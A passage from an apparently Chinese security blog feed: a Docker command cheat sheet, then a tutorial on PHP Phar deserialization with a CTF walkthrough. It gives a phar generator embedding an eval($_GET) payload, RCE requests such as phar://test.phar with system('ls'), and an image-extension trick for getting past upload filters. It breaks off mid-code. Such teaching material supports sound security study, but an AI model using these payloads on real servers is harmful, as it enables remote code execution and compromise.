class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看已有镜像</span><br>docker images<br><br><span class="hljs-comment"># 查看正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment"># 查看所有容器</span><br>docker ps -a<br><br><span class="hljs-comment"># 构建镜像</span><br>docker build -t 镜像名字 .<br><br><span class="hljs-comment"># 运行镜像</span><br>docker run -itd -p &lt;主机端口&gt;:&lt;容器端口&gt; --name &lt;容器名字&gt; &lt;镜像名字&gt;<br>如：docker run -itd -p 2323:8080 --name crazy crazy:latest<br>docker run -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 以 /bin/sh 权限进入容器交互界面</span><br>docker <span class="hljs-built_in">exec</span> -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 启动容器</span><br>docker start &lt;容器名或ID&gt;<br><br><span class="hljs-comment"># 暂停容器</span><br>docker stop &lt;容器名或ID&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Phar反序列化</title>
    <link href="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar"></a>什么是<code>Phar</code></h1><p>JAR 是开发 Java 程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个 JAR 文件里，使得部署过程十分简单</p><p><code>phar</code>是 PHP 里类似于 JAR 的一种打包文件，说白了其本质可以理解为一个压缩包</p><p>对于 PHP 5.3 或更高版本，<code>phar</code>后缀文件时默认开启支持的，可以直接使用</p><p>一般使用文件包含中的**<code>phar</code>伪协议<strong>进行读取</strong><code>.phar</code>文件**</p><h1 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a><code>Phar</code>文件结构</h1><ul><li>**<code>stub phar：</code>**这是<code>phar</code>文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>（头部信息），这是 PHAR 文件的入口点，当 PHP 解释器加载 PHAR 文件时，会首先执行 Stub 代码</li><li><strong><code>manifest：</code><strong>压缩文件的属性等信息，以</strong>序列化</strong>方式存储</li><li>**<code>contents：</code>**压缩文件的内容</li><li>**<code>signature：</code>**签名，放在文件末尾</li></ul><p><strong><code>phar</code>协议</strong>解析文件时，会自动触发对**<code>manifest</code>字段<strong>的</strong>序列化字符串<strong>进行</strong>反序列化**</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420202950641.png" alt="image-20250420202950641"></p><p>以下是官方文档，红框部分是要进行利用的序列化部分</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420203104476.png" alt="image-20250420203104476"></p><p><strong><code>phar</code>文件的压缩和解压缩</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 压缩</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test2.phar&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;test2.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">buildfromDirectory</span>(<span class="hljs-string">&#x27;f:\0Day&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setDefaultStub</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>Phar</code>类：</strong><code>Phar</code>是 PHP 内置的一个类，用于创建、操作和管理 PHAR 文件</li><li>**<code>$phar = new Phar(&#39;test2.phar&#39;,0,&#39;test2.phar&#39;);</code>**第一个参数<code>test2.phar</code>是创建的 PHAR 文件名，如果文件不存在会创建一个新的文件，如果文件存在并允许进行修改，会对其进行更新；第二个参数<code>0</code>表示文件创建的标志，实际应用中会使用如：<code>Phar::CREATE</code>表示创建新的 PHAR 文件，来指定不同的创建模式；第三个参数<code>test2.phar</code>指定 PHAR 文件的别名，可以在后续中引用该 PHAR 文件时使用</li><li>**<code>$phar-&gt;buildfromDirectory(&#39;f:\0Day&#39;);</code>**指定要打包的目录路径</li><li>**<code>$phar-&gt;setDefaultStub(&#39;test.txt&#39;,&#39;test.txt&#39;);</code>**中<code>setDefaultStub</code>用于为 PHAR 文件设置默认的 Stub，即默认入口；第一个参数<code>test.txt</code>是入口文件的路径，第二个参数 <code>&#39;test.txt&#39;</code> 是内部文件的路径</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 解压缩</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>**<code>$phar = new Phar(&#39;test.phar&#39;);</code>**通过 <code>new Phar(&#39;test.phar&#39;)</code> 语句，程序尝试打开名为 <code>test.phar</code> 的 Phar 压缩包文件，并将其封装成一个 <code>Phar</code> 对象存储在变量 <code>$phar</code> 中。如果 <code>test.phar</code> 文件不存在，会报错</li><li>**<code>$phar-&gt;extractTo(&#39;test&#39;);</code>**调用 <code>Phar</code> 对象的 <code>extractTo</code> 方法，该方法的作用是将 Phar 压缩包中的所有内容提取到指定的目录；参数 <code>&#39;test&#39;</code> 是目标目录，即 Phar 压缩包中的文件和目录会被解压到名为 <code>test</code> 的目录下。如果该目录不存在，PHP 会尝试创建它；若已存在，则会将文件解压到该目录内</li></ul><h2 id="创建一个-phar文件的模板"><a href="#创建一个-phar文件的模板" class="headerlink" title="创建一个.phar文件的模板"></a>创建一个<code>.phar</code>文件的模板</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>具体解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 删除之前的test.par文件(如果有)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 创建一个phar对象，文件名必须以 .phar 为后缀</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 开始写文件</span><br><span class="hljs-comment"># 调用startBuffering()这个函数意味着后续的写入操作不会立即将数据写入文件，而是先存储在缓冲区中，直到调用stopBuffering()方法</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># 写入stub（是 Phar 文件的入口点，当 Phar 文件被执行时，首先会执行 stub 中的代码）</span><br><span class="hljs-comment"># 括号中的代码是默认的，是一个特殊的 PHP 指令，用于停止 PHP 代码的编译，后面的数据会被当作二进制数据处理</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-comment"># 要写入文件中的部分</span><br><span class="hljs-comment"># 创建一个 Testobj 类的对象 $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># 设置output属性的内容</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-comment"># 调用 setMetadata 方法，将 $o 对象作为元数据写入 Phar 文件中（写入meta-data）</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># 将字符串 &quot;test&quot; 作为文件内容，以 test.txt 为文件名添加到 Phar 压缩包中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># 停止写入文件</span><br><span class="hljs-comment"># 调用 stopBuffering 方法，停止缓冲，并将缓冲区中的数据写入到 test.phar 文件中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Phar反序列化漏洞原理"><a href="#Phar反序列化漏洞原理" class="headerlink" title="Phar反序列化漏洞原理"></a><code>Phar</code>反序列化漏洞原理</h1><p><code>manifest</code>压缩文件的属性等信息，以序列化存储，存在一段序列化的字符串</p><p>调用<code>phar</code>伪协议，可读取<code>.phar</code>文件</p><p><code>phar</code>协议解析文件时，会自动触发对<code>manifest</code>字段的序列化字符串进行反序列化</p><p><code>phar</code>需要满足 PHP &gt;&#x3D; 5.2，在<code>php.ini</code>中将<code>phar.readonly</code>设为<code>Off</code></p><p>以下是这个漏洞受到影响的函数（即可以使用<code>phar</code>伪协议读取<code>.phar</code>文件的函数）</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175359494.png" alt="image-20250421175359494"></p><h3 id="具体题目解析"><a href="#具体题目解析" class="headerlink" title="具体题目解析"></a>具体题目解析</h3><p>第一个是漏洞页面<code>index.php</code>，源码如下</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175611356.png" alt="image-20250421175611356"></p><p>第二个是可以生成<code>phar</code>文件的页面<code>phar.php</code>，源码如下</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175706263.png" alt="image-20250421175706263"></p><p><strong>审计代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&quot;echo &#x27;ok&#x27;;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;output);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>在漏洞页面<code>index.php</code>的源码中，定义了<code>Testobj</code>这个类，有一个属性<code>output</code>，和一个<code>__destruct()</code>魔术方法，会执行<code>output</code>的内容，这里可以进行RCE执行命令</li><li>然后是可以GET传参<code>filename</code>，并且使用了<code>file_exists()</code>函数检查文件或目录是否存在，这个函数存在与受影响的函数之中，所以这里存在<code>phar</code>反序列化漏洞</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment"># 删除之前的test.par文件(如果有)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 创建一个phar对象，文件名必须以 .phar 为后缀</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 开始写文件</span><br><span class="hljs-comment"># 调用startBuffering()这个函数意味着后续的写入操作不会立即将数据写入文件，而是先存储在缓冲区中，直到调用stopBuffering()方法</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># 写入stub（是 Phar 文件的入口点，当 Phar 文件被执行时，首先会执行 stub 中的代码）</span><br><span class="hljs-comment"># 括号中的代码是默认的，是一个特殊的 PHP 指令，用于停止 PHP 代码的编译，后面的数据会被当作二进制数据处理</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><span class="hljs-comment"># 创建一个 Testobj 类的对象 $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># 设置output属性的内容</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><span class="hljs-comment"># 调用 setMetadata 方法，将 $o 对象作为元数据写入 Phar 文件中（写入meta-data）</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># 将字符串 &quot;test&quot; 作为文件内容，以 test.txt 为文件名添加到 Phar 压缩包中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># 停止写入文件</span><br><span class="hljs-comment"># 调用 stopBuffering 方法，停止缓冲，并将缓冲区中的数据写入到 test.phar 文件中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>在<code>phar.php</code>页面可以生成<code>.phar</code>文件，源码中同样定义了<code>Testobj</code>类和<code>output</code>属性，与<code>index.php</code>中的一致</li><li>生成<code>.phar</code>文件部分的解析见源码</li></ul><p>在<code>index.php</code>页面中传入GET参数<code>filename</code>，其值为<code>/etc/passwd</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ilename=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421181801644.png" alt="image-20250421181801644"></p><p>正常会根据文件是否存在得到一个布尔值的回显</p><p>因为这里使用的是<code>file_exists</code>函数，是可以使用<code>phar://</code>伪协议的，但是可以使用<code>phar</code>伪协议并不代表一定存在<code>phar</code>反序列化漏洞，还要看能否触发魔术方法进而可以执行一些操作，在这里就是要触发<code>__destruct()</code>这个魔术方法进而可以执行命令，所以存在漏洞</p><p>访问<code>phar.php</code>这个页面，然后这个页面中的代码会自动生成一个<code>test.phar</code>的文件，查看<code>tmp</code>目录下会发现生成了这个文件</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184245937.png" alt="image-20250421184245937"></p><p>可以使用<code>xxd</code>命令查看文件内容</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184338480.png" alt="image-20250421184338480"></p><p>可以看到写入了序列化后的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Testobj&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;output&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;eval(<span class="hljs-subst">$_GET</span>[&quot;</span>a<span class="hljs-string">&quot;]);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>接着在<code>index.php</code>页面中查看这个文件发现是存在的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=test.phar<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421183120702.png" alt="image-20250421183120702"></p><p>最后就可以利用<code>phar</code>伪协议读取这个文件，会自动将序列化部分的数据进行反序列化，然后就会自动触发<code>__destruct()</code>魔术方法，从而可以执行<code>eval($_GET[&quot;a&quot;]);</code>，也就是可以进行GET传参一个<code>a</code>进行RCE</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.phar<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184732520.png" alt="image-20250421184732520"></p><h1 id="Phar反序列化漏洞使用条件"><a href="#Phar反序列化漏洞使用条件" class="headerlink" title="Phar反序列化漏洞使用条件"></a><code>Phar</code>反序列化漏洞使用条件</h1><ul><li><code>phar</code>文件可以上传到服务器端</li><li>要有可用反序列化魔术方法作为跳板（就是可以通过触发魔术方法<code>__destruct()</code>或<code>__wakeup()</code>进行RCE之类的操作）</li><li>要有文件操作函数，如：<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code></li><li>文件操作函数的参数可控</li><li>要使用的伪协议<code>phar://</code>中的字符和关键字没有被过滤</li></ul><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191301040.png" alt="image-20250421191301040"></p><h2 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h2><p><strong>使用<code>phar://</code>伪协议读取文件是不看后缀的</strong></p><p>如果服务器对上传的文件有限制，只能上传一些<code>png</code>、<code>jpg</code>、<code>gif</code>等图片文件，我们可以把<code>phar</code>文件修改成其他的任何一个格式的文件，并且不会受到影响</p><p>如下，使用<code>mv</code>命令将<code>test.phar</code>文件修改成<code>test.png</code>文件，改变其后缀名</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421185913907.png" alt="image-20250421185913907"></p><p>然后使用<code>phar</code>伪协议读取<code>test.png</code>文件仍然是可以执行命令的</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.png<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421190111156.png" alt="image-20250421190111156"></p><p>所以后缀名是没有影响的，只要可以上传到服务器就行</p><h1 id="Phar反序列化例题"><a href="#Phar反序列化例题" class="headerlink" title="Phar反序列化例题"></a><code>Phar</code>反序列化例题</h1><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><code>index.php</code>页面源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可以发现定义了一个<code>TestObject()</code>类，存在一个<code>__destruct()</code>魔术方法可以获取<code>flag.php</code>中的flag，然后可以进行传参一个POST参数<code>file</code>，并使用<code>md5_file</code> 函数读取指定文件的内容，并基于这些内容生成哈希值，提示有一个<code>upload.php</code>页面，访问发现可以上传文件，并且根据标题可知只能上传图片文件</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191439247.png" alt="image-20250421191439247"></p><p>这里使用<code>md5_file</code> 函数读取指定文件，并且有上传文件的接口，存在<code>phar</code>反序列化漏洞，可以通过上传一个<code>phar</code>文件，并在<code>index.php</code>页面通过POST参数<code>file</code>读取文件，从而进行反序列化触发<code>__destruct()</code>魔术方法获取flag，不过指定了上传的文件只能是图片，但是在前面学习的小知识中可知可以将<code>phar</code>文件后缀改成其他的，并且不受影响，所以可以上传一个图片格式并可以被解析</p><p>首先可以先试试POST传参file查看文件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">file</span><span class="hljs-operator">=/</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421192916940.png" alt="image-20250421192916940"></p><p>可以看到可以读取到<code>/etc/passwd</code>文件并输出一段哈希值</p><p>这题中满足了以下条件，可以进行<code>phar</code>反序列化的利用<img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194052111.png" alt="image-20250421194052111"></p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a><strong>解题步骤</strong></h3><ul><li>**生成一个<code>phar</code>文件：**在<code>mate-data</code>里放置一个包含<code>TestObject()</code>序列化字符串</li><li><strong>上传文件：</strong><code>md5_file</code>执行伪协议，触发反序列化，从而触发<code>__destruct()</code>魔术方法执行<code>echo flag</code></li></ul><h3 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h3><p><strong>生成一个<code>phar</code>文件</strong></p><p>可以在自己本地的<code>PhpStorm</code>中生成一个<code>phar</code>文件，不过注意要设置<code>PhpStorm</code>中的<code>phar.readonly</code>为<code>Off</code>，否则会出现以下报错</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194809962.png" alt="image-20250421194809962"></p><p>找到当前使用的php版本的<code>php.ini</code>文件</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421195235055.png" alt="image-20250421195235055"></p><p>直接搜索找到<code>phar.readonly</code>就行，以下是原本的样子</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200406776.png" alt="image-20250421200406776"></p><p>把<code>On</code>修改为<code>Off</code>，还要把前面的分号去掉，修改后如下</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200456451.png" alt="image-20250421200456451"></p><p>然后直接运行以下脚本就可以在脚本的同一目录下生成<code>phar</code>文件了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 